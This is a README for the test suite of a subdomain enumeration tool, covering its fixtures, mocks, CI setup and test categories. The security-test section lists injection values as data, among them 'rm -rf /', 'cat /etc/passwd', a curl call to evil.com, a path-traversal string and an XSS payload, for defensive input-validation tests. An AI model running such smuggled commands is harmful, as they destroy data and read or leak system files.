# Domain Enumeration Test Suite

## Overview

This comprehensive test suite validates the functionality, performance, and security of the domain enumeration module. It includes unit tests, integration tests, and performance benchmarks to ensure reliable and secure subdomain discovery operations.

## Test Structure

```
tests/
├── conftest.py                 # Shared fixtures and configuration
├── test_domain_enumeration.py  # Main test suite
├── test_integration.py         # Integration tests (real network)
├── test_performance.py         # Performance and load tests
├── test_security.py           # Security and edge case tests
└── test_utils.py              # Test utilities and helpers
```

## Test Categories

### 🧪 **Unit Tests** (`pytest -m unit`)
- **Initialization Testing**: Configuration validation and object creation
- **Method Testing**: Individual function behavior and return values
- **Error Handling**: Exception handling and error recovery
- **Rate Limiting**: Token bucket algorithm validation
- **Wordlist Generation**: Dynamic wordlist creation and merging
- **DNS Operations**: Mock DNS queries and response handling

### 🔗 **Integration Tests** (`pytest -m integration`)
- **Real Domain Testing**: Safe enumeration against example.com
- **API Integration**: External service connectivity (when API keys available)
- **Network Resilience**: Timeout and failure handling
- **End-to-End Workflows**: Complete enumeration scenarios

### 🏃 **Performance Tests** (`pytest -m slow`)
- **Load Testing**: Large wordlist processing
- **Concurrency Testing**: Multi-threaded operation validation
- **Memory Usage**: Resource consumption monitoring
- **Rate Limiting Accuracy**: Timing and throughput validation

### 🔒 **Security Tests** (`pytest -m security`)
- **Input Validation**: Malformed domain handling
- **Injection Prevention**: SQL/Command injection protection
- **Rate Limiting Bypass**: Security control validation
- **Data Sanitization**: Output cleaning and validation

## Quick Start

### Running All Tests

```bash
# Run complete test suite
pytest

# Run with verbose output
pytest -v

# Run specific test categories
pytest -m unit
pytest -m integration
pytest -m "not slow"  # Skip performance tests
```

### Running Individual Test Files

```bash
# Domain enumeration tests
python tests/test_domain_enumeration.py

# Integration tests (requires network)
pytest tests/test_integration.py

# Performance tests
pytest tests/test_performance.py --benchmark-only
```

### Coverage Testing

```bash
# Generate coverage report
pytest --cov=src --cov-report=html --cov-report=term-missing

# Coverage with minimum threshold
pytest --cov=src --cov-fail-under=80
```

## Test Configuration

### Environment Variables

Set these variables to control test behavior:

```bash
# Skip network-dependent tests
export SKIP_NETWORK_TESTS=1

# Skip slow performance tests
export SKIP_SLOW_TESTS=1

# Use real API keys for integration testing
export VIRUSTOTAL_API_KEY=your_test_key
export TEST_MODE=integration

# Custom test domain (default: example.com)
export TEST_DOMAIN=your-test-domain.com
```

### pytest.ini Configuration

```ini
[tool:pytest]
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*
markers =
    unit: Unit tests
    integration: Integration tests
    slow: Slow tests that may take time
    network: Tests requiring network access
    security: Security-focused tests
```

## Test Fixtures

### Core Fixtures (conftest.py)

#### `test_domain`
```python
@pytest.fixture
def test_domain():
    return "example.com"
```

#### `test_config`
```python
@pytest.fixture
def test_config():
    config = EnumerationConfig()
    config.rate_limit = 100  # Fast for testing
    config.timeout = 1
    config.thread_count = 2
    return config
```

#### `domain_enumerator`
```python
@pytest.fixture
def domain_enumerator(test_domain, test_config):
    return DomainEnumeration(test_domain, test_config)
```

#### `mock_requests_session`
```python
@pytest.fixture
def mock_requests_session():
    session = Mock()
    response = Mock()
    response.status_code = 200
    response.json.return_value = {'test': 'data'}
    session.get.return_value = response
    return session
```

### Data Fixtures

#### `sample_subdomains`
```python
@pytest.fixture
def sample_subdomains():
    return [
        'www.example.com',
        'mail.example.com',
        'api.example.com',
        'admin.example.com',
        'test.example.com'
    ]
```

#### `sample_dns_records`
```python
@pytest.fixture
def sample_dns_records():
    return {
        'A': ['1.2.3.4', '5.6.7.8'],
        'AAAA': ['2001:db8::1'],
        'MX': ['10 mail.example.com'],
        'NS': ['ns1.example.com', 'ns2.example.com'],
        'TXT': ['v=spf1 include:_spf.example.com ~all']
    }
```

## Test Cases Overview

### TestDomainEnumeration Class

#### Initialization Tests
- ✅ `test_initialization()`: Validates proper object creation
- ✅ `test_config_validation()`: Tests configuration parameter validation
- ✅ `test_rate_limiter()`: Validates rate limiting functionality

#### Subdomain Discovery Tests
- ✅ `test_check_subdomain_success()`: Tests successful DNS resolution
- ✅ `test_check_subdomain_failure()`: Tests DNS resolution failure handling
- ✅ `test_check_subdomain_with_doh_fallback()`: Tests DoH fallback mechanism

#### Wordlist Generation Tests
- ✅ `test_generate_dynamic_wordlist()`: Dynamic wordlist creation
- ✅ `test_generate_target_specific_terms()`: Target-specific term generation
- ✅ `test_generate_llm_based_terms()`: LLM-based term generation
- ✅ `test_generate_permutations()`: Subdomain permutation generation
- ✅ `test_merge_wordlists()`: Wordlist merging and deduplication

#### Active Enumeration Tests
- ✅ `test_enhanced_active_enumeration()`: Complete active enumeration workflow
- ✅ `test_bruteforce_with_rate_limiting()`: Rate-limited brute force testing
- ✅ `test_dns_permutation_attack()`: DNS permutation testing
- ✅ `test_attempt_zone_transfer()`: Zone transfer attempt testing
- ✅ `test_dns_cache_snooping()`: DNS cache snooping validation

#### Network Tests
- ✅ `test_doh_query()`: DNS-over-HTTPS query testing
- ✅ `test_network_error_handling()`: Network failure handling

#### Utility Tests
- ✅ `test_error_handling()`: Error logging and storage
- ✅ `test_results_correlation()`: Result correlation and deduplication

### TestIntegration Class

#### Real Network Tests
- ✅ `test_real_domain_enumeration()`: Safe enumeration against example.com
- ✅ `test_wordlist_loading()`: External wordlist file loading
- ✅ `test_api_integration()`: External API connectivity (when keys available)

## Mock Strategy

### DNS Mocking
```python
@patch('socket.gethostbyname')
def test_dns_resolution(self, mock_gethostbyname):
    mock_gethostbyname.return_value = '1.2.3.4'
    result = self.enumerator._check_subdomain('www')
    self.assertEqual(result, 'www.example.com')
```

### HTTP Request Mocking
```python
@patch.object(DomainEnumeration, 'session')
def test_http_request(self, mock_session):
    mock_response = Mock()
    mock_response.status_code = 200
    mock_response.json.return_value = {'data': 'test'}
    mock_session.get.return_value = mock_response
```

### DNS Resolver Mocking
```python
@patch('dns.resolver.Resolver')
def test_dns_resolver(self, mock_resolver_class):
    mock_resolver = Mock()
    mock_answer = Mock()
    mock_answer.__str__ = Mock(return_value='1.2.3.4')
    mock_resolver.resolve.return_value = [mock_answer]
```

## Performance Testing

### Benchmark Tests
```python
@pytest.mark.benchmark
def test_wordlist_generation_performance(benchmark):
    result = benchmark(enumerator._generate_dynamic_wordlist)
    assert len(result) > 0
```

### Load Testing
```python
@pytest.mark.slow
def test_large_wordlist_processing():
    large_wordlist = ['subdomain{}'.format(i) for i in range(10000)]
    # Test processing without timeouts
```

### Memory Testing
```python
def test_memory_usage():
    import psutil
    process = psutil.Process()
    initial_memory = process.memory_info().rss
    # Perform enumeration
    final_memory = process.memory_info().rss
    assert (final_memory - initial_memory) < threshold
```

## Security Testing

### Input Validation
```python
def test_malformed_domain_handling():
    malformed_domains = [
        '',
        '.',
        '...',
        'domain..com',
        'domain.com.',
        '../../../etc/passwd',
        '<?xml>',
        '<script>alert(1)</script>'
    ]
    for domain in malformed_domains:
        # Should handle gracefully without errors
```

### Injection Prevention
```python
def test_command_injection_prevention():
    malicious_inputs = [
        'domain.com; rm -rf /',
        'domain.com`cat /etc/passwd`',
        'domain.com$(whoami)',
        'domain.com && curl evil.com'
    ]
    # Validate no command execution occurs
```

## Test Data Management

### Sample Responses
```python
SAMPLE_CT_RESPONSE = {
    "subdomains": [
        "www.example.com",
        "api.example.com",
        "mail.example.com"
    ]
}

SAMPLE_DNS_RESPONSE = {
    "Answer": [
        {"name": "example.com.", "type": 1, "data": "93.184.216.34"}
    ]
}
```

### Mock Data Generators
```python
def generate_mock_subdomains(count=100):
    """Generate realistic mock subdomain data"""
    prefixes = ['www', 'api', 'mail', 'admin', 'test', 'dev']
    return [f"{random.choice(prefixes)}{i}.example.com" for i in range(count)]
```

## Continuous Integration

### GitHub Actions Configuration
```yaml
name: Test Suite
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.8, 3.9, '3.10', 3.11, 3.12]
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-test.txt
      - name: Run tests
        run: pytest --cov=src --cov-report=xml
      - name: Upload coverage
        uses: codecov/codecov-action@v3
```

### Tox Configuration
```ini
[testenv]
deps = 
    -r{toxinidir}/requirements.txt
    -r{toxinidir}/requirements-test.txt
commands = 
    pytest {posargs:tests/}

[testenv:coverage]
commands = 
    pytest --cov=src --cov-report=html --cov-fail-under=80
```

## Test Execution Examples

### Basic Test Run
```bash
# Run all tests
pytest

# Output:
# ===== test session starts =====
# collected 19 items
# 
# tests/test_domain_enumeration.py::TestDomainEnumeration::test_initialization PASSED
# tests/test_domain_enumeration.py::TestDomainEnumeration::test_rate_limiter PASSED
# ...
# ===== 19 passed in 2.15s =====
```

### Coverage Report
```bash
pytest --cov=src --cov-report=term-missing

# Output:
# Name                                    Stmts   Miss  Cover   Missing
# ---------------------------------------------------------------------
# src/modules/domain_enumeration.py        450     15    97%   123-127, 234
# ---------------------------------------------------------------------
# TOTAL                                   450     15    97%
```

### Parallel Execution
```bash
# Run tests in parallel (faster execution)
pytest -n auto

# Run specific test pattern
pytest -k "test_dns" -v
```

## Debugging Tests

### Verbose Output
```bash
# Maximum verbosity
pytest -vvv

# Show local variables in tracebacks
pytest --tb=long

# Drop into debugger on failure
pytest --pdb
```

### Log Capture
```bash
# Show captured logs
pytest -s --log-cli-level=INFO

# Capture only specific logs
pytest --log-cli-format='%(asctime)s [%(levelname)8s] %(message)s'
```

## Test Maintenance

### Adding New Tests
1. Follow the naming convention: `test_<functionality>()`
2. Use appropriate fixtures from `conftest.py`
3. Add proper markers for categorization
4. Include docstrings describing the test purpose
5. Mock external dependencies appropriately

### Test Data Updates
```python
# Update sample data regularly
def update_sample_responses():
    """Update sample API responses with current data"""
    # Fetch real responses and sanitize for testing
```

### Performance Monitoring
```python
@pytest.mark.benchmark
def test_performance_regression():
    """Ensure performance doesn't degrade over time"""
    # Benchmark critical operations
```

## Troubleshooting

### Common Test Issues

#### Import Errors
```bash
# Fix Python path issues
export PYTHONPATH="${PYTHONPATH}:$(pwd)/src"
```

#### Network Timeouts
```bash
# Skip network tests in CI
pytest -m "not network"
```

#### Mock Issues
```python
# Ensure mocks are properly reset
@pytest.fixture(autouse=True)
def reset_mocks():
    yield
    # Reset global mocks
```

#### Flaky Tests
```python
# Add retry logic for unstable tests
@pytest.mark.flaky(reruns=3)
def test_unstable_network():
    pass
```

### Test Environment Setup

#### Local Development
```bash
# Install test dependencies
pip install -r requirements-test.txt

# Set up test environment
export TEST_MODE=local
export SKIP_NETWORK_TESTS=1
```

#### CI/CD Environment
```bash
# Minimal test configuration
export TEST_MODE=ci
export SKIP_SLOW_TESTS=1
export SKIP_NETWORK_TESTS=1
```

## Contributing to Tests

### Test Guidelines
1. **Coverage**: Aim for >95% code coverage
2. **Isolation**: Tests should be independent and isolated
3. **Deterministic**: Tests should produce consistent results
4. **Fast**: Unit tests should complete in <1 second each
5. **Realistic**: Use realistic test data and scenarios

### Code Review Checklist
- [ ] Test names clearly describe functionality
- [ ] Appropriate mocking without over-mocking
- [ ] Edge cases and error conditions covered
- [ ] Performance implications considered
- [ ] Security test cases included where relevant
- [ ] Documentation updated for new test patterns

---

**Note**: This test suite is designed to validate the security and reliability of the domain enumeration module. Always ensure tests are run in appropriate environments and never against targets without proper authorization.